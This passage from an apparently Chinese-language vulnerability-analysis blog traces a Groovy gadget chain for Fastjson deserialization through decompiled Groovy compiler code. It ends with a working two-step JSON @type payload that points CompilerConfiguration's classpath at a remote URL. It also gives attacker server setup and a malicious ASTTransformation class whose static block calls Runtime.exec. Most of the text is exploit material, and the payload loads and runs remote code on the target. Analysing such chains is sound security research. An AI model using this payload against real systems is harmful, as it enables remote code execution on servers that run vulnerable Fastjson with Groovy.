function_">setConfiguration</span><span class="hljs-params">(CompilerConfiguration configuration)</span> &#123;<br>    <span class="hljs-built_in">this</span>.configuration = (CompilerConfiguration)Objects.requireNonNull(configuration);<br>&#125;<br><br><span class="hljs-keyword">public</span> GroovyClassLoader <span class="hljs-title function_">getClassLoader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.classLoader;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setClassLoader</span><span class="hljs-params">(GroovyClassLoader loader)</span> &#123;<br>    <span class="hljs-built_in">this</span>.classLoader = loader != <span class="hljs-literal">null</span> ? loader : (GroovyClassLoader)AccessController.doPrivileged(() -&gt; &#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        <span class="hljs-keyword">if</span> (parent == <span class="hljs-literal">null</span>) &#123;<br>            parent = ProcessingUnit.class.getClassLoader();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyClassLoader</span>(parent, <span class="hljs-built_in">this</span>.getConfiguration());<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>GroovyClassLoader构造方法中 this.addClasspath(path);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">GroovyClassLoader</span><span class="hljs-params">(ClassLoader parent, CompilerConfiguration config, <span class="hljs-type">boolean</span> useConfigurationClasspath)</span> &#123;<br>    <span class="hljs-built_in">super</span>(EMPTY_URL_ARRAY, parent);<br>    <span class="hljs-built_in">this</span>.classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnlimitedConcurrentCache</span>();<br>    <span class="hljs-built_in">this</span>.sourceCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedCommonCache</span>();<br>    <span class="hljs-built_in">this</span>.resourceLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyResourceLoader</span>() &#123;<br>        <span class="hljs-keyword">public</span> URL <span class="hljs-title function_">loadGroovySource</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>            <span class="hljs-keyword">return</span> (URL)AccessController.doPrivileged(() -&gt; &#123;<br>                <span class="hljs-type">Iterator</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.config.getScriptExtensions().iterator();<br><br>                <span class="hljs-keyword">while</span>(var2.hasNext()) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> (String)var2.next();<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">URL</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> GroovyClassLoader.<span class="hljs-built_in">this</span>.getSourceFile(filename, extension);<br>                        <span class="hljs-keyword">if</span> (ret != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">return</span> ret;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var5) &#123;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">if</span> (config == <span class="hljs-literal">null</span>) &#123;<br>        config = CompilerConfiguration.DEFAULT;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.config = config;<br>    <span class="hljs-keyword">if</span> (useConfigurationClasspath) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> config.getClasspath().iterator();<br><br>        <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> (String)var4.next();<br>            <span class="hljs-built_in">this</span>.addClasspath(path);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.initSourceEncoding(config);<br>&#125;<br></code></pre></td></tr></table></figure><p>JavaStubCompilationUnit继承ProcessingUnit类，构造方法如下中调用addPhaseOperation()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">JavaStubCompilationUnit</span><span class="hljs-params">(CompilerConfiguration config, GroovyClassLoader gcl, File destDir)</span> &#123;<br>    <span class="hljs-built_in">super</span>(config, (CodeSource)<span class="hljs-literal">null</span>, gcl);<br>    <span class="hljs-keyword">if</span> (destDir == <span class="hljs-literal">null</span>) &#123;<br>        Map&lt;String, Object&gt; options = <span class="hljs-built_in">this</span>.configuration.getJointCompilationOptions();<br>        destDir = (File)options.get(<span class="hljs-string">&quot;stubDir&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">useJava5</span> <span class="hljs-operator">=</span> CompilerConfiguration.isPostJDK5(<span class="hljs-built_in">this</span>.configuration.getTargetBytecode());<br>    <span class="hljs-type">String</span> <span class="hljs-variable">encoding</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.configuration.getSourceEncoding();<br>    <span class="hljs-built_in">this</span>.stubGenerator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaStubGenerator</span>(destDir, <span class="hljs-literal">false</span>, useJava5, encoding);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">VariableScopeVisitor</span>(source)).visitClass(classNode);<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaAwareResolveVisitor</span>(<span class="hljs-built_in">this</span>)).startResolving(classNode, source);<br>    &#125;, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">this</span>.addPhaseOperation((source, context, classNode) -&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.stubGenerator.generateClass(classNode);<br>            ++<span class="hljs-built_in">this</span>.stubCount;<br>        &#125; <span class="hljs-keyword">catch</span> (FileNotFoundException var5) &#123;<br>            source.addException(var5);<br>        &#125;<br><br>    &#125;,<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.control.CompilationUnit#addPhaseOperation()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(ISourceUnitOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperation</span><span class="hljs-params">(IPrimaryClassNodeOperation op, <span class="hljs-type">int</span> phase)</span> &#123;<br>    validatePhase(phase);<br>    <span class="hljs-built_in">this</span>.phaseOperations[phase].add(op);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperations()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperations</span><span class="hljs-params">(CompilationUnit compilationUnit)</span> &#123;<br>    <span class="hljs-type">ASTTransformationsContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> compilationUnit.getASTTransformationsContext();<br>    addGlobalTransforms(context);<br>    compilationUnit.addPhaseOperation((source, ignore, classNode) -&gt; &#123;<br>        <span class="hljs-type">GroovyClassVisitor</span> <span class="hljs-variable">visitor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTTransformationCollectorCodeVisitor</span>(source, compilationUnit.getTransformLoader());<br>        visitor.visitClass(classNode);<br>    &#125;, <span class="hljs-number">4</span>);<br>    CompilePhase[] var2 = CompilePhase.values();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.length;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    ......<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#addGlobalTransforms(context)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context)</span> &#123;<br>    doAddGlobalTransforms(context, <span class="hljs-literal">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms(context, true)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAddGlobalTransforms</span><span class="hljs-params">(ASTTransformationsContext context, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>......<br>    <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>        <span class="hljs-type">Iterator</span> <span class="hljs-variable">var17</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>        <span class="hljs-keyword">while</span>(var17.hasNext()) &#123;<br>            Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var17.next();<br>            context.getGlobalTransformNames().add((String)entry.getKey());<br>        &#125;<br><br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        transformNames.entrySet().removeIf((entryx) -&gt; &#123;<br>            <span class="hljs-keyword">return</span> !context.getGlobalTransformNames().add((String)entryx.getKey());<br>        &#125;);<br>        addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addPhaseOperationsForGlobalTransforms</span><span class="hljs-params">(CompilationUnit compilationUnit, Map&lt;String, URL&gt; transformNames, <span class="hljs-type">boolean</span> isFirstScan)</span> &#123;<br>    <span class="hljs-comment">//获取到被赋予远程classpath的GroovyClassLoader</span><br>    <span class="hljs-type">GroovyClassLoader</span> <span class="hljs-variable">transformLoader</span> <span class="hljs-operator">=</span> compilationUnit.getTransformLoader();<br>    <span class="hljs-type">Iterator</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> transformNames.entrySet().iterator();<br><br>    <span class="hljs-keyword">while</span>(var4.hasNext()) &#123;<br>        Map.Entry&lt;String, URL&gt; entry = (Map.Entry)var4.next();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从远程加载class对象</span><br>            Class&lt;?&gt; gTransClass = transformLoader.loadClass((String)entry.getKey(), <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-type">GroovyASTTransformation</span> <span class="hljs-variable">transformAnnotation</span> <span class="hljs-operator">=</span> (GroovyASTTransformation)gTransClass.getAnnotation(GroovyASTTransformation.class);<br>            <span class="hljs-keyword">if</span> (transformAnnotation == <span class="hljs-literal">null</span>) &#123;<br>                compilationUnit.getErrorCollector().addWarning(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WarningMessage</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; is specified as a global transform in &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; but it is not annotated by &quot;</span> + GroovyASTTransformation.class.getName() + <span class="hljs-string">&quot; the global transform associated with it may fail and cause the compilation to fail.&quot;</span>, (CSTNode)<span class="hljs-literal">null</span>, (SourceUnit)<span class="hljs-literal">null</span>));<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ASTTransformation.class.isAssignableFrom(gTransClass)) &#123;<br>                <span class="hljs-comment">//将远程类实例化</span><br>                <span class="hljs-type">ASTTransformation</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> (ASTTransformation)gTransClass.getDeclaredConstructor().newInstance();<br>                <span class="hljs-keyword">if</span> (instance <span class="hljs-keyword">instanceof</span> CompilationUnitAware) &#123;<br>                    ((CompilationUnitAware)instance).setCompilationUnit(compilationUnit);<br>                &#125;<br><br>                CompilationUnit.<span class="hljs-type">ISourceUnitOperation</span> <span class="hljs-variable">suOp</span> <span class="hljs-operator">=</span> (source) -&gt; &#123;<br>                    instance.visit(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ASTNode</span>[]&#123;source.getAST()&#125;, source);<br>                &#125;;<br>                <span class="hljs-keyword">if</span> (isFirstScan) &#123;<br>                    compilationUnit.addPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    compilationUnit.addNewPhaseOperation(suOp, transformAnnotation.phase().getPhaseNumber());<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Transform Class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot; is not an ASTTransformation.&quot;</span>, (ProcessingUnit)<span class="hljs-literal">null</span>));<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-type">Throwable</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> var10 <span class="hljs-keyword">instanceof</span> InvocationTargetException ? var10.getCause() : var10;<br>            compilationUnit.getErrorCollector().addError(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleMessage</span>(<span class="hljs-string">&quot;Could not instantiate global transform class &quot;</span> + (String)entry.getKey() + <span class="hljs-string">&quot; specified at &quot;</span> + ((URL)entry.getValue()).toExternalForm() + <span class="hljs-string">&quot;  because of exception &quot;</span> + ((Throwable)t).toString(), (ProcessingUnit)<span class="hljs-literal">null</span>));<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">1.</span>利用隐式类关系将org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、org.codehaus.groovy.control.CompilerConfiguration加入到maping中<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Exception&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilationFailedException&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;unit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-number">2.</span>利用链加载远程类<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.ProcessingUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;</span><span class="hljs-punctuation">,</span><br> <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;</span><span class="hljs-punctuation">,</span><br>           <span class="hljs-attr">&quot;classpath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;url地址xxx&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>服务器配置：</p><p>新建文件 META-INF&#x2F;services&#x2F;org.codehaus.groovy.transform.ASTTransformation</p><p>文件内容为MyExction</p><p>http根目录放置MyExction.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.ast.ASTNode;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.control.SourceUnit;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.ASTTransformation;<br><span class="hljs-keyword">import</span> org.codehaus.groovy.transform.GroovyASTTransformation;<br><br><span class="hljs-meta">@GroovyASTTransformation</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyExction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ASTTransformation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">visit</span><span class="hljs-params">(ASTNode[] astNodes, SourceUnit sourceUnit)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var1);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/92e85c41-0a14-438a-82c0-9b4ef077db7a.png" alt="image-20220922165655351"></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
